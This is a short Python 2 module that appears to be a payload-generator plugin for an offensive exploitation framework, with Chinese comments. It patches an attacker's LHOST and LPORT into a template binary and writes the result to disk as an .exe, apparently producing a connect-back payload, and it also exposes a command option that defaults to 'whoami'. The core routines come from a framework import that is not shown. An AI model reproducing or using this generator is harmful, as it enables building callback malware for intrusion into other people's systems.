#! /usr/bin/env python
# -*- coding: utf-8 -*-

from lib.ple.tools.lib.payloads.payload import * 



class Payload(BGExploit):
        
    def __init__(self):
        super(self.__class__, self).__init__()

        #自定义显示参数
        self.register_option({
            "COMMAND": {
                "default": "whoami",
                "desc": "执行命令",
                "Required":"no"
            },
            "FILEPATH": {
                "default": "/test.exe",
                "desc": "保存文件的路径名",
                "Required":"no"
            }
        })


    #写出文件
    def write_exe(self,file_data,path_name):
        print u"[+] 保存中..."
        try:
            ex_datas = file_data.decode("hex")
            ff = open(path_name,'wb')
            ff.write(ex_datas)
            ff.close()
            print u"[+] 文件保存路径在" + path_name
        except:
            print u"[-] 文件保存失败!请检查路径或参数"
        
    def payload(self):
        ex_ip = self.options.LHOST['default']
        ex_port = self.options.LPORT['default']
        path_name = self.options.FILEPATH['default']
        ex_ip,ex_port = self.cover(ex_ip,ex_port)
        print u"[+] 正在转换..."
        file_data = self.open_file()
        get_data = self.get_ex(file_data, ex_ip, ex_port)
        self.write_exe(get_data,path_name)
